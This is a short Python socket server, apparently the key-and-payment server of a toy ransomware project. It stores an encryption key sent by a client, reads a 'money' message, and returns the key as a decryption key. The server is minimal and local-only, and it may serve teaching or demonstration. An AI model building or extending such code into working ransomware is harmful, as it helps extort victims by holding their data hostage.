import socket

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('localhost', 12345)
server_socket.bind(server_address)
server_socket.listen(5)
print("Server listening on {}:{}".format(*server_address))

while True:
    print("Waiting for a connection...")
    client_socket, client_address = server_socket.accept()
    print("Accepted connection from {}:{}".format(*client_address))

    key = client_socket.recv(1024)
    print("Received data: {}".format(key))
    
    with open("received_encryption_key.key", "wb") as K:
        K.write(key)
        
    money = client_socket.recv(1024)
    print("Received money: {}".format(money.decode('utf-8')))
    print("sending key")
    
    with open("received_encryption_key.key", "rb") as K:
    	decyrption_key = K.read()
       
    client_socket.send(decyrption_key)
    
    client_socket.close()
